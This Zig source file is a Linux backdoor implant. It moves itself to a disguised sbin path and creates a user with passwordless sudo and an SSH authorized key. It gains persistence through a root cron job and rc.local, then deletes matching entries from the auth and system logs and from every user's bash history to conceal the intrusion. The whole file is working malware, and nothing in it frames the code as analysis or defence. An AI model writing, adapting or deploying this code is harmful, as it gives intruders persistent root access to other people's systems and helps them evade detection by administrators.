const std = @import("std");

const username = "obscure_user_name";
const pub_key = "ssh-ed25519 PUTSSHPUBKEYHEREPLEASETHANKYOU";
const binary_path = "/usr/local/sbin/obscure_service_name";
const binary_name = std.fs.path.basename(binary_path);
const cron_entry = "*/5 * * * * root " ++ binary_path ++ "\n";
const rc_local_path = "/etc/rc.local";
const sudoers_entry = username ++ " ALL=(ALL) NOPASSWD:ALL\n";
const log_paths = [_][]const u8{ "/var/log/auth.log", "/var/log/secure", "/var/log/syslog" };
const clean_keywords = [_][]const u8{ "useradd", "new user", "added user", username, "sudoers", binary_path };

fn runCommand(allocator: std.mem.Allocator, argv: []const []const u8) !void {
    const result = try std.process.Child.run(.{ .allocator = allocator, .argv = argv });
    if (result.term.Exited != 0) {
        return error.CommandFailed;
    }
}

fn fileContains(allocator: std.mem.Allocator, path: []const u8, needle: []const u8) !bool {
    const file = try std.fs.cwd().openFile(path, .{});
    defer file.close();
    const content = try file.readToEndAlloc(allocator, 1024 * 1024);
    defer allocator.free(content);
    return std.mem.indexOf(u8, content, needle) != null;
}

fn appendToFileIfMissing(allocator: std.mem.Allocator, path: []const u8, content: []const u8, check_needle: []const u8) !void {
    if (try fileContains(allocator, path, check_needle)) return;
    var file = try std.fs.cwd().openFile(path, .{ .mode = .write_only });
    defer file.close();
    try file.seekTo(try file.getEndPos());
    _ = try file.writeAll(content);
}

fn cleanLog(allocator: std.mem.Allocator, log_path: []const u8, keywords: []const []const u8) !void {
    const file = try std.fs.cwd().openFile(log_path, .{ .mode = .read_write });
    defer file.close();
    const content = try file.readToEndAlloc(allocator, 1024 * 1024);
    defer allocator.free(content);

    var lines = std.array_list.AlignedManaged([]const u8, null).init(allocator);
    defer lines.deinit();
    var it: std.mem.SplitIterator(u8, .scalar) = std.mem.splitScalar(u8, content, '\n');
    while (it.next()) |line| {
        var keep = true;
        for (keywords) |kw| {
            if (std.mem.indexOf(u8, line, kw) != null) {
                keep = false;
                break;
            }
        }
        if (keep) try lines.append(line);
    }

    try file.seekTo(0);
    try file.setEndPos(0);
    for (lines.items, 0..) |line, i| {
        _ = try file.writeAll(line);
        if (i < lines.items.len - 1) _ = try file.writeAll("\n");
    }
}

fn cleanHistory(allocator: std.mem.Allocator, hist_path: []const u8, keywords: []const []const u8) !void {
    const file = std.fs.cwd().openFile(hist_path, .{ .mode = .read_write }) catch return; // Ignore if missing
    defer file.close();
    const content = try file.readToEndAlloc(allocator, 1024 * 1024);
    defer allocator.free(content);

    var lines = std.array_list.AlignedManaged([]const u8, null).init(allocator);
    defer lines.deinit();
    var it: std.mem.SplitIterator(u8, .scalar) = std.mem.splitScalar(u8, content, '\n');
    while (it.next()) |line| {
        var keep = true;
        for (keywords) |kw| {
            if (std.mem.indexOf(u8, line, kw) != null) {
                keep = false;
                break;
            }
        }
        if (keep) try lines.append(line);
    }

    try file.seekTo(0);
    try file.setEndPos(0);
    for (lines.items, 0..) |line, i| {
        _ = try file.writeAll(line);
        if (i < lines.items.len - 1) _ = try file.writeAll("\n");
    }
}

pub fn main() !void {
    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();
    const allocator = arena.allocator();
    const cwd = std.fs.cwd();

    const self_path = try std.fs.selfExePathAlloc(allocator);
    defer allocator.free(self_path);
    const original_name = std.fs.path.basename(self_path);

    if (!std.mem.eql(u8, self_path, binary_path)) {
        cwd.deleteFile(binary_path) catch |err| switch (err) {
            error.FileNotFound => {},
            else => return err,
        };
        try std.fs.copyFileAbsolute(self_path, binary_path, .{});
        var binary_file = try cwd.openFile(binary_path, .{});
        defer binary_file.close();
        try binary_file.chmod(0o755);
        try std.fs.deleteFileAbsolute(self_path);
    }

    _ = cwd.access(rc_local_path, .{}) catch |err| if (err == error.FileNotFound) {
        var file = try cwd.createFile(rc_local_path, .{});
        defer file.close();
        _ = try file.writeAll("#!/bin/sh -e\n");
        try file.chmod(0o755);
    };

    const user_exists = (try std.process.Child.run(.{ .allocator = allocator, .argv = &[_][]const u8{ "getent", "passwd", username } })).term.Exited == 0;
    var created = false;
    if (!user_exists) {
        try runCommand(allocator, &[_][]const u8{ "useradd", "-m", "-s", "/bin/bash", "-G", "sudo", username });
        const pwd_opt = std.c.getpwnam(username);

        const home_dir_path = try std.mem.concat(allocator, u8, &[_][]const u8{ "/home/", username });
        const ssh_dir_path = try std.mem.concat(allocator, u8, &[_][]const u8{ home_dir_path, "/.ssh" });
        const auth_file_path = try std.mem.concat(allocator, u8, &[_][]const u8{ ssh_dir_path, "/authorized_keys" });

        if (pwd_opt) |pwd| {
            try cwd.makeDir(ssh_dir_path);
            const ssh_dir = try cwd.openDir(ssh_dir_path, .{ .iterate = true });
            try ssh_dir.chown(pwd.uid, pwd.gid);
            try ssh_dir.chmod(0o711);

            var auth = try cwd.createFile(auth_file_path, .{});
            defer auth.close();
            _ = try auth.writeAll(pub_key);
            try auth.chown(pwd.uid, pwd.gid);
            try auth.chmod(0o600);
        } else {
            return error.UserNotFound;
        }

        const sudoers_path = try std.mem.concat(allocator, u8, &[_][]const u8{ "/etc/sudoers.d/", username });
        var sudo_file = try cwd.createFile(sudoers_path, .{});
        defer sudo_file.close();
        _ = try sudo_file.writeAll(sudoers_entry);
        try sudo_file.chmod(0o440);

        created = true;
    }

    try appendToFileIfMissing(allocator, "/etc/crontab", cron_entry, binary_path);

    try appendToFileIfMissing(allocator, rc_local_path, binary_path ++ "\n", binary_path);

    for (log_paths) |log_path| {
        cleanLog(allocator, log_path, &clean_keywords) catch {};
    }

    var history_keywords_list = std.array_list.AlignedManaged([]const u8, null).init(allocator);
    defer history_keywords_list.deinit();
    try history_keywords_list.append(binary_name);
    try history_keywords_list.append(binary_path);
    if (!std.mem.eql(u8, original_name, binary_name)) {
        try history_keywords_list.append(original_name);
    }

    var history_paths_list = std.array_list.AlignedManaged([]const u8, null).init(allocator);
    defer history_paths_list.deinit();

    try history_paths_list.append("/root/.bash_history");

    var home_dir = cwd.openDir("/home", .{ .iterate = true }) catch |err| blk: {
        if (err != error.FileNotFound) return err;
        break :blk null;
    };

    if (home_dir) |*dir| {
        defer dir.close();
        var iter = dir.iterate();
        while (try iter.next()) |entry| {
            if (entry.kind == .directory) {
                const hist_path = try std.mem.concat(allocator, u8, &[_][]const u8{ "/home/", entry.name, "/.bash_history" });
                try history_paths_list.append(hist_path);
            }
        }
    }

    for (history_paths_list.items) |hist_path| {
        cleanHistory(allocator, hist_path, history_keywords_list.items) catch {};
        if (!std.mem.eql(u8, hist_path, "/root/.bash_history")) {
            allocator.free(hist_path);
        }
    }
}
